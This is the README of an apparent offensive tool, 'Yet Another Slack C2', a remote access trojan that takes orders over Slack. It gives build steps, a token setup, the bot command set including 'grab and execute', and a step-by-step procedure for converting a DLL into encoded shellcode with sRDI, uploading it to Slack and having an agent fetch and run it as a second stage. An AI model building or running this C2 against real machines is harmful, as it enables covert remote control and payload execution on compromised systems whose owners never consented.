
# YASC

Yet Another Slack C2

## Credits

Some of the supporting code was borrowed from the POCO library. The comments were stripped from all code, which removed the licensing from the files. Should probably put that back.

JSON library credit to https://github.com/nlohmann/json

## Build

### Requirements

If you wish to package a file for execution, you will need sRDI: `git clone https://github.com/monoxgas/sRDI.git`

- Visual Studios 2019

### HOWTO

Create yasc\clients\cpp\cpp\slack_auth.txt

with contents (no spaces, no quotes, no endline):
```
STR(<oauth token>)
```

e.g. STR(abcd-123456)

It should build out of the box. Just build the cpp project.

## Controlling

All of the commands currently implemented are in rat.cpp:get_tasking()

```
if (todo._Starts_with("gtfo"))
else if (todo._Starts_with("who am i"))
else if (todo._Starts_with("be quiet"))
else if (todo._Starts_with("start talking"))
else if (todo._Starts_with("talk every "))
else if (todo._Starts_with("grab and execute "))
```

To talk to a specific bot: Hey \<GUID\>, \<command\> \<parameters\>

e.g.: Hey IPxxzxcevaIT, gtfo

One day we will move those out and just pass the `todo` line to another function that will process them based on a defined yaml file that is shared between all clients and the controller... One day.

To have it load a second stage:

```
> cd sRDI\Python
sRDI\Python> py ConvertToShellcode.py <path_to_dll>
# That created <path_to_dll>.bin

sRDI\Python> cd solo.ranger\controller
yasc\controller> py gen_stage2.py <path_to_dll>.bin <path_to_dll>_encoded.bin
# <path_to_dll>_encoded.bin now contains "an encoded shellcode" 
# Upload to slack and "grab and execute" by an agent
```